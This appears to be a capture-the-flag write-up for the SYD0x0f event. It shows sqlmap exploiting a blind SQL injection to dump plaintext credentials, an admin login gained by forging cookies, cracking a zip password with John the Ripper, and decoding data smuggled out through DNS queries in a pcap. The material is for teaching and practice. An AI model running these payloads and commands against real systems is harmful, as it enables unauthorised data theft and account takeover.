# SYD0x0f
## Web - Flag 1
Manual testing of the login page using a username of a single quote and a password of "test" returns an error page
```SQL
Fatal Error: MySQL Query Error: SELECT * from users where username = ''' and password = 'a'
```
Lets switch over to SQLMap to validate our testing
```console
root@kali:~# sqlmap --data 'username=john&password=john' -p username -u 'http://52.63.238.93/index.php' --dbms=mysql
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150429}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and
federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:37:55

[10:37:55] [INFO] testing connection to the target URL
[10:37:55] [INFO] heuristics detected web page charset 'ascii'
[10:37:55] [INFO] testing if the target URL is stable. This can take a couple of seconds
[10:37:56] [INFO] target URL is stable
[10:37:56] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[10:37:56] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to XSS attacks
[10:37:56] [INFO] testing for SQL injection on POST parameter 'username'
do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n]
[10:38:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:38:11] [WARNING] reflective value(s) found and filtering out
[10:38:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
sqlmap got a 302 redirect to 'http://52.63.238.93:80/admin/index.php'. Do you want to follow? [Y/n]
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N]
[10:38:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:38:18] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'
[10:38:18] [INFO] POST parameter 'username' seems to be 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)' injectable
---8<---
[10:38:29] [INFO] POST parameter 'username' seems to be 'MySQL > 5.0.11 AND time-based blind (SELECT)' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection points with a total of 195 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
    Payload: username=john' RLIKE (SELECT (CASE WHEN (5744=5744) THEN 0x6a6f686e ELSE 0x28 END)) AND 'iSRU'='iSRU&password=john

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
    Payload: username=john' AND (SELECT * FROM (SELECT(SLEEP(5)))MKmf) AND 'kDJo'='kDJo&password=john
---
[10:38:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
[10:38:49] [INFO] fetched data logged to text files under '/root/.sqlmap/output/52.63.238.93'

[*] shutting down at 10:38:49
```
Lets find all of the databases
```console
root@kali:~# sqlmap --data 'username=john&password=john' -p username -u 'http://52.63.238.93/index.php' --dbms=mysql --dbs
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150429}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and
federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:43:06

[10:43:06] [INFO] testing connection to the target URL
[10:43:06] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
    Payload: username=john' RLIKE (SELECT (CASE WHEN (5744=5744) THEN 0x6a6f686e ELSE 0x28 END)) AND 'iSRU'='iSRU&password=john

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
    Payload: username=john' AND (SELECT * FROM (SELECT(SLEEP(5)))MKmf) AND 'kDJo'='kDJo&password=john
---
[10:43:06] [INFO] testing MySQL
[10:43:06] [INFO] confirming MySQL
[10:43:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[10:43:06] [INFO] fetching database names
[10:43:06] [INFO] fetching number of databases
[10:43:06] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[10:43:06] [INFO] retrieved:
[10:43:06] [WARNING] reflective value(s) found and filtering out
4
[10:43:06] [INFO] retrieved: information_schema
[10:43:11] [INFO] retrieved: mysql
[10:43:13] [INFO] retrieved: performance_schema
[10:43:18] [INFO] retrieved: zeropoint
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] zeropoint

[10:43:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/52.63.238.93'

[*] shutting down at 10:43:21
```
Lets see what tables exists in the zeropoint database
```console
root@kali:~# sqlmap --data 'username=john&password=john' -p username -u 'http://52.63.238.93/index.php' --dbms=mysql -D zeropoint --tables
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150429}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and
federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:43:41

[10:43:41] [INFO] testing connection to the target URL
[10:43:41] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
    Payload: username=john' RLIKE (SELECT (CASE WHEN (5744=5744) THEN 0x6a6f686e ELSE 0x28 END)) AND 'iSRU'='iSRU&password=john

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
    Payload: username=john' AND (SELECT * FROM (SELECT(SLEEP(5)))MKmf) AND 'kDJo'='kDJo&password=john
---
[10:43:41] [INFO] testing MySQL
[10:43:41] [INFO] confirming MySQL
[10:43:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[10:43:41] [INFO] fetching tables for database: 'zeropoint'
[10:43:41] [INFO] fetching number of tables for database 'zeropoint'
[10:43:41] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[10:43:41] [INFO] retrieved:
[10:43:41] [WARNING] reflective value(s) found and filtering out
1
[10:43:41] [INFO] retrieved: users
Database: zeropoint
[1 table]
+-------+
| users |
+-------+

[10:43:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/52.63.238.93'

[*] shutting down at 10:43:43
```
Now lets dump the contents of the users table
```console
root@kali:~# sqlmap --data 'username=john&password=john' -p username -u 'http://52.63.238.93/index.php' --dbms=mysql -D zeropoint -T users --dump
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150429}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and
federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:43:53

[10:43:53] [INFO] testing connection to the target URL
[10:43:53] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
    Payload: username=john' RLIKE (SELECT (CASE WHEN (5744=5744) THEN 0x6a6f686e ELSE 0x28 END)) AND 'iSRU'='iSRU&password=john

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
    Payload: username=john' AND (SELECT * FROM (SELECT(SLEEP(5)))MKmf) AND 'kDJo'='kDJo&password=john
---
[10:43:53] [INFO] testing MySQL
[10:43:53] [INFO] confirming MySQL
[10:43:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[10:43:53] [INFO] fetching columns for table 'users' in database 'zeropoint'
[10:43:53] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[10:43:53] [INFO] retrieved:
[10:43:53] [WARNING] reflective value(s) found and filtering out
2
[10:43:53] [INFO] retrieved: username
[10:43:56] [INFO] retrieved: password
[10:43:58] [INFO] fetching entries for table 'users' in database 'zeropoint'
[10:43:58] [INFO] fetching number of entries for table 'users' in database 'zeropoint'
[10:43:58] [INFO] retrieved: 2
[10:43:58] [INFO] retrieved: acsc2016
[10:44:01] [INFO] retrieved: john
[10:44:02] [INFO] retrieved: NoHackingAllowed
[10:44:07] [INFO] retrieved: admin
[10:44:09] [INFO] analyzing table dump for possible password hashes
Database: zeropoint
Table: users
[2 entries]
+----------+------------------+
| username | password         |
+----------+------------------+
| john     | acsc2016         |
| admin    | NoHackingAllowed |
+----------+------------------+

[10:44:09] [INFO] table 'zeropoint.users' dumped to CSV file '/root/.sqlmap/output/52.63.238.93/dump/zeropoint/users.csv'
[10:44:09] [INFO] fetched data logged to text files under '/root/.sqlmap/output/52.63.238.93'

[*] shutting down at 10:44:09
```
After logging in as john, you'll see the first flag **flag{d37fcf5615b10427d96aa95c0aa183ba}** under the tasks panel.
## Web - Flag 2
If you attempt to log in as admin, you'll receive an error "Correct password. However security policy currenty prevents direct logins as admin from your IP.".
If you open up Chromes inspector and look at the cookies you'll notice there are two cookies named "username" and "isadmin".
When logged in as john the username cookies value is "john" and the isadmin cookies value is false.
Using a cookie editor and change the username cookie value to "admin" and the isadmin cookie value to true we'll get the second flag **flag{744af6c3f5d9cc8ce0e24174afc2a0fc}** when you browse to the Secure File Storage section.
## Forensics - Flag 3
In the Secure File Storage section when logged in as admin there is a link to a file named "file.zip".
Attempting to unzip the file you'll be prompted for a password. I initially tried to crack the password using fcrackzip but it was generating too many false positive passwords. Even when I tried using the "-u" option in fcrackzip to validate password by attempting to unzip the file it was taking ages. Switching over to using john the ripper I was able to crack the password nearly instantly.
```console
root@kali $ zip2john file.zip > zip.hashes
file.zip->secret.pcap PKZIP Encr: cmplen=1206, decmplen=4297, crc=CEE1B5FA
root@kali $ john zip.hashes
Loaded 1 password hash (PKZIP [32/64])
alice            (file.zip)
guesses: 1  time: 0:00:00:01 DONE (Thu Apr 21 02:55:51 2016)  c/s: 11738  trying: 123456 - 222222
Use the "--show" option to display all of the cracked passwords reliably
root@kali $ unzip -P alice file.zip
Archive:  file.zip
  inflating: secret.pcap
```
Inside the zip file is packet capture. Looking at the packet capture there are a bunch of DNS and NetBIOS traffic. What's really interesting is the DNS lookups for really long domains.
```console
root@kali $ tshark -r secret.pcap -Y 'dns && dns.flags.response==0' -T fields -e dns.qry.name
436f6e67726174756c6174696f6e732121210a666c61677b653039313738.ctf.rip
313434303334656635306663353164356630643465353364626238366263.ctf.rip
633166323034643936646536343230646665616261323539346438307d0a.ctf.rip
```
If we concatonate the three subdomain and hex decode we find the third flag **flag{e09178144034ef50fc51d5f0d4e53dbb86bcc1f204d96de6420dfeaba2594d80}**.
```console
root@kali $ ipython2
Python 2.7.11 (default, Jan 11 2016, 23:22:46)
Type "copyright", "credits" or "license" for more information.

IPython 4.1.2 -- An enhanced Interactive Python.
?         -> Introduction and overview of IPython's features.
%quickref -> Quick reference.
help      -> Python's own help system.
object?   -> Details about 'object', use 'object??' for extra details.

In[1]print('436f6e67726174756c6174696f6e732121210a666c61677b653039313738313434303334656635306663353164356630643465353364626238366263633166323034643936646536343230646665616261323539346438307d0a'.decode('hex'))
Congratulations!!!
flag{e09178144034ef50fc51d5f0d4e53dbb86bcc1f204d96de6420dfeaba2594d80}
```
## Credits and thanks
Thanks to steffnj for assistance and brainstorming
Thanks to Kris Hunt(@CTFKris) for putting together the CTF. It was a fun and challenging CTF.
